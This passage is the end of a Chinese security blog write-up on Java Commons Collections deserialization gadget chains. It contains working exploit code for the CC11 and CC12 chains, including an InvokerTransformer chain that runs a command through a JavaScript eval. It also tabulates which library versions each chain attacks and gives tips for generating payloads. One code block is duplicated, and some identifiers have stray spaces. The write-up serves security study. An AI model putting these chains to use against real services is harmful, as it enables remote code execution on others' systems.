<span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            keyField = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            keyField = Class.forName(<span class="hljs-string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125;<br>        keyField.setAccessible(<span class="hljs-keyword">true</span>);<br>        keyField.set(node,tiedmap);<br><br>        Field f3 = transformer.getClass().getDeclaredField(<span class="hljs-string">&quot;iMethodName&quot;</span>);<br>        f3.setAccessible(<span class="hljs-keyword">true</span>);<br>        f3.set(transformer,<span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./cc11&quot;</span>));<br>            outputStream.writeObject(hashset);<br>            outputStream.close();<br><br>            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;./cc11&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>







<h2 id="0x12-Commons-Collections-12"><a href="#0x12-Commons-Collections-12" class="headerlink" title="0x12 Commons Collections 12"></a>0x12 Commons Collections 12</h2><p>与CC6的区别就是引入了js来支持执行更多命令，主要修改了transformer的构造</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8673">https://xz.aliyun.com/t/8673</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre class=" language-hljs java">String[] execArgs = <span class="hljs-keyword">new</span> String[]&#123;cmd&#125;;<br>      Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(S criptEngineManager.class),<br>              <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newInstance&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> O bject[<span class="hljs-number">0</span>]),<br>              <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getEngineByName&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                      <span class="hljs-keyword">new</span> O bject[]&#123;<span class="hljs-string">&quot;J avaS cript&quot;</span>&#125;), <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;e val&quot;</span>,<br>              <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, execArgs), <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number"><code class="language-hljs java">String[] execArgs = <span class="hljs-keyword">new</span> String[]&#123;cmd&#125;;<br>      Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(S criptEngineManager.class),<br>              <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newInstance&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> O bject[<span class="hljs-number">0</span>]),<br>              <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getEngineByName&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                      <span class="hljs-keyword">new</span> O bject[]&#123;<span class="hljs-string">&quot;J avaS cript&quot;</span>&#125;), <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;e val&quot;</span>,<br>              <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, execArgs), <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br></code></pre></td></tr></table></figure>



<h1 id="0x4-总结"><a href="#0x4-总结" class="headerlink" title="0x4 总结"></a>0x4 总结</h1><h2 id="0x4-1-适用版本总结"><a href="#0x4-1-适用版本总结" class="headerlink" title="0x4.1 适用版本总结"></a>0x4.1 适用版本总结</h2><p>CommonsCollections1 commons-collections:3.1</p>
<p>CommonsCollections1,3,5,6,7,10用的还是commons-collections:3.1</p>
<p>CommonsCollections9 适用于3.2.1</p>
<p>CommonsCollections2,4,8，其利用链基于CommonsCollections:4.0版本</p>
<p>CommonsCollections11 适用于CommonsCollections:3.1-3.2.1 JDK版本：暂无限制</p>
<p>最终结果如下：</p>
<p>![图片](Commons Collections/f9899374c0a7105a4b5ffe928cacfb06c.jpg)</p>
<p>CommonsCollections11 适用于CommonsCollections:3.1-3.2.1 JDK版本：暂无限制</p>
<p>最后，据不完全统计推荐打CC的时候，</p>
<p>建议本地使用JDK7 commons-collections4-4.0 分别用CC4、CC3生成两个版本</p>
<p>建议本地使用JDK7 commons-collections3.1 用CC10或者CC11生成payload 3.* 都可以打</p>
<h2 id="0x4-2-CC链总结"><a href="#0x4-2-CC链总结" class="headerlink" title="0x4.2 CC链总结"></a>0x4.2 CC链总结</h2><p>重要的不是这个链多变的形式，而是怎么发现的。</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10457#toc-12">https://xz.aliyun.com/t/10457#toc-12</a></p>
<p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1536">http://wjlshare.com/archives/1536</a></p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/120">https://forum.butian.net/share/120</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/313390.html">https://www.freebuf.com/articles/web/313390.html</a></p>
</div><script src="/js/jquery.min.js"></script><script src="/js/main.js"></script></body></html>